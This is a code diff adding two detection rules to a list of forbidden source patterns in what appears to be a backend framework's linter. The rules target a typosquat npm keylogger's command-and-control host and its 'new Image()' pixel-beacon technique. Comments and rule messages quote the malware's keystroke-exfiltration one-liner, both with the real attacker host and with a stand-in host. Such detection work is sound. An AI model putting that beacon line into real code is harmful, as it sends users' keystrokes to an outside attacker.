@@ -1132,6 +1132,66 @@ const FORBIDDEN_PATTERNS: readonly ForbiddenPattern[] = [
       "remove this literal",
     keepStrings: true,
   },
+  // ---- react-login-page typosquat / pixel-beacon keylogger
+  //      (Socket 2024-07-02,
+  //      https://socket.dev/blog/malicious-npm-package-typosquats-react-login-page-to-deploy-keylogger) ----
+  //
+  // The `reect-login-page` typosquat (and ~16 sibling packages from the
+  // `lolapalooza` npm author — `react-1ogin-page`, `@reect-login-page/base`,
+  // `sty1ed-react-modal`, etc.) embedded a React component that:
+  //
+  //   1. Installed a `document.addEventListener('keydown', ...)` handler
+  //      that appended every keystroke to a `keys` string;
+  //   2. Fetched the victim's IP from `api.ipify.org` into a side channel;
+  //   3. Every 1000 ms, sent the accumulated keystrokes by setting
+  //      `new Image().src = "https://adlinczewska.pl/beaut-login/keylog.php?c=" + keys`
+  //      — a `<img>`-pixel beacon chosen specifically to bypass CORS,
+  //      since image requests are not subject to the Same-Origin Policy.
+  //
+  // `@daloyjs/core` is a backend HTTP framework. `src/**` is server-side
+  // Node code with no DOM globals — neither `document` nor the `Image`
+  // constructor exist there, and the framework has no legitimate reason
+  // to ever materialize the documented C2 host as a string literal. The
+  // patterns below are belt-and-braces: they make sure a malicious PR or
+  // a malicious-republish payload cannot land the documented IOC host
+  // or the pixel-beacon exfil TTP as text inside `src/**`.
+  {
+    // The exact C2 host + path documented in the Socket write-up. Kept
+    // as a hard IOC literal (mirrors the `informer-server.herokuapp.com`
+    // and `rough-breeze-0c37.buidanhnam95.workers.dev` precedents above).
+    re: /\badlinczewska\.pl\/beaut-login\b/i,
+    reason:
+      "`adlinczewska.pl/beaut-login` is the documented C2 host + path for the " +
+      "`reect-login-page` typosquat keylogger family (16 packages from npm author " +
+      "`lolapalooza`, including `react-1ogin-page`, `@reect-login-page/base`, and " +
+      "`sty1ed-react-modal`) which exfiltrated every keystroke via " +
+      "`new Image().src = \"https://adlinczewska.pl/beaut-login/keylog.php?c=\" + keys` " +
+      "(https://socket.dev/blog/malicious-npm-package-typosquats-react-login-page-to-deploy-keylogger); " +
+      "any reference in `src/**` is a hard IOC",
+    keepStrings: true,
+  },
+  {
+    // `new Image()` is a DOM-only constructor (browser `Image` /
+    // `HTMLImageElement`). `@daloyjs/core` is a backend HTTP framework
+    // — `src/**` runs in Node / Bun / Deno where `Image` does not
+    // exist as a global. A `new Image()` literal inside runtime source
+    // is therefore both dead code AND the documented pixel-beacon
+    // exfil primitive used to bypass CORS in browser-side malware
+    // (the `<img>` request is not subject to the Same-Origin Policy,
+    // so `new Image().src = url + secrets` is a one-liner cross-origin
+    // exfiltration channel). Require either `new Image(` or
+    // `new Image (` so an identifier like `newImage` is not matched.
+    re: /\bnew\s+Image\s*\(/,
+    reason:
+      "`new Image()` is a DOM-only browser constructor that does not exist as a global in " +
+      "Node / Bun / Deno; library source for a backend HTTP framework has zero legitimate " +
+      "reason to mention it, and it is the documented CORS-bypassing pixel-beacon exfil " +
+      "primitive used by the `reect-login-page` typosquat keylogger family " +
+      "(`new Image().src = \"https://attacker/keylog.php?c=\" + keystrokes`) " +
+      "(https://socket.dev/blog/malicious-npm-package-typosquats-react-login-page-to-deploy-keylogger) — " +
+      "remove this literal",
+    keepStrings: false,
+  },
 ];
 
 const STRING_LITERAL_RE = /"(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])*'|`(?:\\.|[^`\\])*`/g;
